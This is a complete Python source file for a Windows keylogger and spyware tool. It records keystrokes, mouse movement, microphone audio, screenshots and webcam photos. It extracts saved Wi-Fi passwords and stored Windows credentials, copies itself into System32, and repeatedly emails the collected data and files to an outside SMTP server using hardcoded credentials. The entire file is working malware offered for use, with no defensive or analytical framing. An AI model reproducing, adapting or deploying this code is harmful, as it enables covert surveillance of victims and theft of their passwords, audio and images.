try:
    import os
    import cv2
    import wmi
    import time
    import socket
    import shutil
    import signal
    import atexit
    import base64
    import getpass
    import smtplib
    import requests
    import platform
    import pythoncom
    import threading
    import win32cred
    import subprocess
    import pyscreenshot
    import soundfile as sf
    import sounddevice as sd
    from pynput import mouse
    from pynput import keyboard
    from pydub import AudioSegment
    from email.mime.base import MIMEBase
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email import encoders

except ModuleNotFoundError:
    from subprocess import run
    missing_modules = []

    def check_module(module_name):
        try:
            __import__(module_name)
        except ModuleNotFoundError:
            missing_modules.append(module_name)

    modules = ["opencv-python", "wmi", "pywin32", "requests", "pyscreenshot", "sounddevice", "soundfile", "pydub", "pynput"]

    for module in modules:
        check_module(module)

    if missing_modules:
        run(["pip", "install"] + missing_modules)

finally:
    temp_dir = "temp"
    os.makedirs(temp_dir, exist_ok = True)

    def cleanup_temp_dir():
        if os.path.exists(temp_dir) and os.path.isdir(temp_dir):
            shutil.rmtree(temp_dir)
        else:
            pass

    def signal_exit(signum, frame):
        cleanup_temp_dir()
        exit(0)

    signal.signal(signal.SIGINT, signal_exit)
    signal.signal(signal.SIGTERM, signal_exit)

    atexit.register(cleanup_temp_dir)

    EMAIL_ADDRESS = "a36f2db379fade"
    EMAIL_PASSWORD = "e79b8e24d4c8c9"
    IP_INFO_TOKEN = "052c054ec65ee7"
    SEND_REPORT_EVERY = 10

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Has Started...\nHere is some information about the target system:\n\n"
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def onMove(self, x, y):
            current_move = f"Mouse moved to {x} {y}\n"
            self.appendlog(current_move)

        def onClick(self, x, y, button, pressed):
            action = "Pressed" if pressed else "Released"
            button_name = str(button).split('.')[-1]
            current_click = f"Mouse {action} at {x} {y} ({button_name})\n"
            self.appendlog(current_click)

        def onScroll(self, x, y, dx, dy):
            current_scroll = f"Mouse scrolled at {x} {y} ({dx}, {dy})\n"
            self.appendlog(current_scroll)

        def onPress(self, key):
            numeric_numpad_keycodes = {96, 97, 98, 99, 100, 101, 102, 103, 104, 105}

            if hasattr(key, 'vk') and key.vk in numeric_numpad_keycodes:
                self.appendlog(str(key.vk - 96))
            else:
                try:
                    current_key = str(key.char)
                    if current_key == ' ':
                        current_key = ' '
                    self.appendlog(current_key)

                except AttributeError:
                    if key == keyboard.Key.space:
                        self.appendlog(' ')
                    elif key == keyboard.Key.esc:
                        self.appendlog("ESC")
                    else:
                        self.appendlog(str(key))

        def send_mail(self, message_subject, message_body, attachment_paths = None):
            sender = self.email
            receiver = self.email

            msg = MIMEMultipart() # Creates an instance of 'MIMEMultipart', a class for creating MIME objects.
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = message_subject

            body = message_body
            msg.attach(MIMEText(body, 'plain')) # Attaches the plain text body to the email message.

            if attachment_paths:
                for attachment_path in attachment_paths:
                    attachment = MIMEBase('application', 'octet-stream') # Creates a MIMEBase object for handling binary data attachments.
                    with open(attachment_path, 'rb') as attachment_file:
                        attachment.set_payload(attachment_file.read()) # Reads the content of the attachment file and sets it as the payload of the MIMEBase object.
                    encoders.encode_base64(attachment)
                    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}') # Adds a header to the attachment specifying its disposition and filename.
                    msg.attach(attachment)

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server: # Establishes a connection to the SMTP server using the provided host ('smtp.mailtrap.io') and port (2525).
                server.login(self.email, self.password) # Logs in to the SMTP server using the provided email and password.
                server.sendmail(sender, receiver, msg.as_string()) # Sends the email message using the 'sendmail' method, providing sender, receiver, and the formatted email message.

        def microphone(self):
            fs = 44100  # Represents the sampling frequency (in Hz) for the audio recording.
            seconds = SEND_REPORT_EVERY
            audio_path = os.path.join(temp_dir, "audio.wav")

            try:
                with sd.InputStream(samplerate = fs, channels = 2):
                    recording = sd.rec(int(seconds * fs), samplerate = fs, channels = 2, dtype = 'int16')
                    sd.wait()

                sf.write(audio_path, recording, fs)
                self.appendlog("Audio recorded successfully.\n")

                try:
                    AudioSegment.from_wav(audio_path)
                    self.appendlog("Audio file is playable.\n")

                except Exception as e:
                    error_message = f"Error: Audio file is not playable - {str(e)}\n"
                    self.appendlog(error_message)

            except sd.PortAudioError as pa_error:
                self.appendlog(f"An error occurred in PortAudio: {str(pa_error)}\n")

            except Exception as e:
                self.appendlog(f"An error occurred while recording audio: {str(e)}\n")

        def screenshot(self):
            try:
                img = pyscreenshot.grab()
                img_path = os.path.join(temp_dir, "screenshot.png")
                img.save(img_path)

                if os.path.isfile(img_path):
                    self.appendlog("Screenshot saved successfully.\n")
                else:
                    self.appendlog("Screenshot was not saved successfully.\n")

            except Exception as e:
                self.appendlog(f"An error occurred while taking a screenshot: {str(e)}\n")

        def get_wifi_passwords(self):
            wifi_passwords = []

            try:
                profiles = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8", errors = "replace")
                profile_names = [line.split(":")[1].strip() for line in profiles.splitlines() if "All User Profile" in line]

                for name in profile_names:
                    try:
                        wifi_info = subprocess.check_output(["netsh", "wlan", "show", "profile", "name=" + name, "key=clear"]).decode("utf-8", errors = "replace")
                        password = [line.split(":")[1].strip() for line in wifi_info.splitlines() if "Key Content" in line][0]
                        wifi_passwords.append({"WiFi Name": name, "Password": password})
                    except subprocess.CalledProcessError:
                        continue

            except subprocess.CalledProcessError:
                wifi_passwords.append({"WiFi Name": "Error retrieving WiFi passwords.", "Password": ""})

            return wifi_passwords

        def get_ip_config(self):
            try:
                ip_config_output_bytes = subprocess.check_output(["ipconfig", "/all"])
                ip_config_output = ip_config_output_bytes.decode("utf-8", errors = "replace")
                self.appendlog(ip_config_output)

            except subprocess.CalledProcessError:
                return "Error retrieving IP configuration."

        def take_photo(self):
            cap = cv2.VideoCapture(0)

            if not cap.isOpened():
                self.appendlog("Camera failed to open...\n")
                return

            ret, frame = cap.read()

            if not ret:
                self.appendlog("Frame could not be captured.\n")
                return

            if cap.isOpened():
                self.appendlog("Frame saved successfully.\n")

                frame_path = os.path.join(temp_dir, "captured_frame.jpg")
                cv2.imwrite(frame_path, frame)

                cv2.destroyAllWindows()
                cap.release()

        def get_os_info(self):
            systeminfo_output_bytes = subprocess.check_output(["systeminfo"])
            systeminfo_output = systeminfo_output_bytes.decode("utf-8", errors = "replace")
            self.appendlog("\nOS Info:\n")
            self.appendlog(systeminfo_output)

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            user = getpass.getuser()

            system_info = f"Hostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\nUser: {user}\n"

            self.appendlog(system_info)

        def formatted_data(self, data, indent = 0):
            formatted_output = ""
            for key, value in data.items():
                if isinstance(value, dict):
                    formatted_output += "   "
                    formatted_output += "\n\n" + "   " + "   " * indent + f"{key}:"
                    formatted_output += self.formatted_data(value, indent + 1)
                else:
                    formatted_output += "\n" + "   " + "   " * indent + f"{key}: {value}"
            return formatted_output

        def get_public_ip_info(self, token):
            url = "https://ipinfo.io/json"
            headers = {
                "Authorization": f"Bearer {token}"
            }
            response = requests.get(url, headers = headers)
            data = response.json()

            ordered_keys = [
                "ip", "hostname", "city", "region", "country", "loc",
                "postal", "timezone", "asn", "company", "privacy",
                "abuse", "domains"
            ]

            ordered_data = {key: data[key] for key in ordered_keys if key in data}

            formatted_info = self.formatted_data(ordered_data)
            self.appendlog("Public IP Info:")
            self.appendlog(formatted_info)

        def get_credentials(self):
            credentials = []

            creds = win32cred.CredEnumerate(None, 0)

            if creds:
                for cred in creds:
                    username = cred['UserName']
                    target_name = cred['TargetName']
                    credential_blob = cred['CredentialBlob']

                    if credential_blob:
                        password = self.get_password_from_blob(credential_blob)
                    else:
                        password = ""

                    credentials.append((username, target_name, password))

            return credentials

        def get_password_from_blob(self, credential_blob):
            try:
                base64.b64decode(credential_blob)
                password = credential_blob.decode('latin-1')
                return password
            except Exception:
                return "Error decoding password"

        def send_credentials(self):
            try:
                credentials = self.get_credentials()

                if credentials:
                    credentials_text = ""
                    for idx, (username, target_name, password) in enumerate(credentials, start = 1):
                        credentials_text += f"Credentials {idx}:\n"
                        credentials_text += f"Username: {username}\n"
                        credentials_text += f"Target Name: {target_name}\n"
                        credentials_text += f"Password: {password}\n\n"

                    credentials_path = os.path.join(temp_dir, "credentials.txt")
                    with open(credentials_path, "w") as f:
                        f.write(credentials_text)

                        with open(credentials_path, "r") as file:
                            content = file.read()
                            if content:
                                self.appendlog('Credentials saved to txt file.\n')
                else:
                    self.appendlog("No credentials found.\n")

            except Exception as e:
                self.appendlog("An error occurred while getting credentials: {}\n".format(e))

        def get_local_users_info(self):
            pythoncom.CoInitialize()
            c = wmi.WMI()
            users = c.Win32_UserAccount()

            user_info_list = []

            for user in users:
                user_info = {
                    "Username": user.Caption,
                    "Name": user.Name,
                    "FullName": user.FullName,
                    "Domain": user.Domain,
                    "Description": user.Description,
                    "SID": user.SID,
                    "Disabled": user.Disabled,
                    "AccountType": user.AccountType,
                    "Status": user.Status,
                    "LocalAccount": user.LocalAccount,
                    "Lockout": user.Lockout,
                    "PasswordChangeable": user.PasswordChangeable,
                    "PasswordExpires": user.PasswordExpires,
                    "PasswordRequired": user.PasswordRequired,
                }
                user_info_list.append(user_info)

            return user_info_list

        def send_user_info(self, user_info):
            user_info_str = f"Username: {user_info['Username']}\n" \
                            f"  Name: {user_info['Name']}\n" \
                            f"  FullName: {user_info['FullName']}\n" \
                            f"  Domain: {user_info['Domain']}\n" \
                            f"  Description: {user_info['Description']}\n" \
                            f"  SID: {user_info['SID']}\n" \
                            f"  Disabled: {user_info['Disabled']}\n" \
                            f"  Account Type: {user_info['AccountType']}\n" \
                            f"  Status: {user_info['Status']}\n" \
                            f"  Local Account: {user_info['LocalAccount']}\n" \
                            f"  Lockout: {user_info['Lockout']}\n" \
                            f"  Password Changeable: {user_info['PasswordChangeable']}\n" \
                            f"  Password Expires: {user_info['PasswordExpires']}\n" \
                            f"  Password Required: {user_info['PasswordRequired']}\n\n" \
                            f"{'-' * 40}"\
                            f"\n\n"
            self.appendlog(user_info_str)

        def send_local_users_info(self):

            local_users_info = self.get_local_users_info()

            c = wmi.WMI()
            users = c.Win32_UserAccount()

            if local_users_info:
                self.appendlog("Local User Accounts:\n")
                for username in users:
                    self.appendlog(f"-   {username.Name}\n")
                self.appendlog('\n')
                for user_info in local_users_info:
                    self.send_user_info(user_info)
            else:
                self.appendlog("No local user accounts found.\n")

        def copy_to_system32(self):
            try:
                source_path = os.path.abspath(__file__)
                destination_path = r"C:\Windows\System32"

                target_file_path = os.path.join(destination_path, os.path.basename(source_path))

                if os.path.exists(target_file_path):
                    with open(target_file_path, 'rb') as target_file, open(source_path, 'rb') as source_file:
                        if target_file.read() != source_file.read():
                            with open(target_file_path, 'wb') as target_file:
                                with open(source_path, 'rb') as source_file:
                                    target_file.write(source_file.read())
                            self.appendlog(f"File content updated in {destination_path} directory.\n")
                        else:
                            self.appendlog(f"File already exists with the same content in {destination_path} directory.\n")
                else:
                    shutil.copy(source_path, destination_path)
                    self.appendlog(f"File successfully copied to {destination_path} directory.\n")

            except PermissionError:
                self.appendlog(f"Access denied while copying file to {destination_path}.\n")

            except Exception as e:
                self.appendlog("An error occurred:", e)
                self.appendlog('\n\n')

        def clear_log(self):
            self.log = ""

        def run(self):
            microphone_thread = threading.Thread(target = self.microphone)
            screenshot_thread = threading.Thread(target = self.screenshot)
            credentials_thread = threading.Thread(target = self.send_credentials)
            local_users_thread = threading.Thread(target = self.send_local_users_info)

            mouse_listener = mouse.Listener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
            keyboard_listener = keyboard.Listener(on_press = self.onPress)

            wifi_passwords = self.get_wifi_passwords()
            wifi_info_string = "\n".join([f"WiFi Name: {item['WiFi Name']}, Password: {item['Password']}" for item in wifi_passwords])

            self.system_information()
            self.appendlog('\n')
            self.copy_to_system32()
            credentials_thread.start()
            microphone_thread.start()
            screenshot_thread.start()
            self.take_photo()
            self.appendlog('\n')
            self.appendlog("WiFi Information On The Target System:\n\n")
            self.appendlog(wifi_info_string)
            self.appendlog('\n')
            self.get_ip_config()
            self.appendlog('\n')
            self.get_public_ip_info(IP_INFO_TOKEN)
            self.appendlog('\n')
            self.get_os_info()
            local_users_thread.start()
            self.appendlog('\n\n')

            with keyboard_listener, mouse_listener:
                microphone_thread.join()
                screenshot_thread.join()
                credentials_thread.join()
                local_users_thread.join()

                attachment_paths = [
                    os.path.join(temp_dir, "audio.wav"),
                    os.path.join(temp_dir, "screenshot.png"),
                    os.path.join(temp_dir, "captured_frame.jpg"),
                    os.path.join(temp_dir, "credentials.txt")
                ]
                self.send_mail("Keylogger Report", self.log, attachment_paths)

            self.clear_log()

            while True:
                microphone_thread = threading.Thread(target = self.microphone)
                screenshot_thread = threading.Thread(target = self.screenshot)

                mouse_listener = mouse.Listener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
                keyboard_listener = keyboard.Listener(on_press = self.onPress)

                self.take_photo()
                microphone_thread.start()
                screenshot_thread.start()

                with keyboard_listener, mouse_listener:
                    microphone_thread.join()
                    screenshot_thread.join()

                    attachment_paths = [
                        os.path.join(temp_dir, "audio.wav"),
                        os.path.join(temp_dir, "screenshot.png"),
                        os.path.join(temp_dir, "captured_frame.jpg"),
                    ]
                    self.send_mail("Keylogger Report", self.log, attachment_paths)
                    time.sleep(SEND_REPORT_EVERY)

                self.clear_log()

    if __name__ == "__main__":
        keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
        keylogger.run()

        try:
            pwd = os.path.abspath(os.getcwd())
            os.chdir(pwd)
            os.system("TASKKILL /F /IM " + os.path.basename(__file__))
            keylogger.appendlog('File was closed.')
            os.system("DEL " + os.path.basename(__file__))

        except OSError:
            keylogger.appendlog('File is close.')
